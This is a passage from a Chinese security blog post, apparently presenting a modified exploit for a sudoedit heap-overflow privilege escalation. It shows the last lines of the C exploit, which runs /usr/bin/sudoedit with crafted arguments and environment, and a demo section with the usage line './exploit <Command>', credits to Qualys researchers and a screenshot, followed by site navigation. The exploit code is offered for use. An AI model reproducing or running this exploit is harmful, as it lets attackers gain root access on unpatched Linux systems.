</span></span><span style=display:flex><span>		<span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>1</span>]); 
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>		
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>execve</span>(<span style=color:#e6db74>&#34;/usr/bin/sudoedit&#34;</span>, sudoedit_argv, envp);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;execvp of stdread failed&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>close</span>(des_p[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>wait</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>wait</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=0x03-演示效果>0x03 演示效果</h2><pre tabindex=0><code>Usage: ./exploit &lt;Command&gt; 
[+]Refrence : @Qualys Research Team @Max Kamper 
[+]Modify by Rvn0xsy@ https://payloads.online
</code></pre><p><a href=https://images.payloads.online/aff69068-4f5f-11ec-aa00-00d861bf4abb.png data-fancybox=gallery data-caption=2021-02-10-03-18-26><img src=https://images.payloads.online/aff69068-4f5f-11ec-aa00-00d861bf4abb.png alt=2021-02-10-03-18-26></a></p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2021-02-16/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>红队技巧：基于反向代理的水坑攻击</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2021-02-08/1/><span>静态恶意代码逃逸（第十课）</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><script src=/js/fancybox.umd.js></script><script>Fancybox.bind('[data-fancybox="gallery"]',{})</script><script src=/js/pangu.min.js></script><script>document.addEventListener("DOMContentLoaded",()=>{pangu.spacingElementByClassName("prose")})</script><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>